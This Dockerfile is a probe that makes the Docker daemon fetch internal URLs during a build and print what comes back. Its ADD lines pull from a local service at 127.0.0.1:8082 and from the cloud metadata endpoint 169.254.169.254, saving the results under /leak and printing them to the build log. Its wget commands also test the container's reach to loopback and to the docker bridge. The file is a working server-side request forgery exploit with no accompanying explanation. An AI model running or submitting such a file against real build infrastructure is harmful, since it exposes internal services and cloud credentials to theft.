FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'N=ADDFETCH_0926_0010; echo "[MARK] $N"; echo "[CONTRAST-container-loopback-127.0.0.1:8082]"; busybox wget -q -T 5 -O - http://127.0.0.1:8082/script/build-dockerfile 2>&1 | head -c 300; echo; echo "[CONTRAST-container-172.17.0.1:8082]"; busybox wget -q -T 5 -O - http://172.17.0.1:8082/script/build-dockerfile 2>&1 | head -c 300; echo'
ADD http://127.0.0.1:8082/script/build-dockerfile /leak/skywing.txt
RUN /bin/sh -c 'echo "[DAEMON-FETCH-skywing-8082]"; ls -la /leak 2>&1; echo "---content---"; cat /leak/skywing.txt 2>&1 | head -c 12000; echo; echo "[END-SKYWING]"'
ADD http://169.254.169.254/latest/meta-data/ /leak/meta/
RUN /bin/sh -c 'echo "[DAEMON-FETCH-169.254.169.254]"; ls -la /leak/meta 2>&1; echo "---content---"; cat /leak/meta/* 2>&1 | head -c 3000; echo; echo "[END-META]"'
ADD http://127.0.0.1:8082/ /leak/skywing-root.txt
RUN /bin/sh -c 'echo "[DAEMON-FETCH-skywing-root]"; cat /leak/skywing-root.txt 2>&1 | head -c 3000; echo; echo "[END] ADDFETCH_0926_0010"'
ENTRYPOINT ["/bin/sh","-c"]
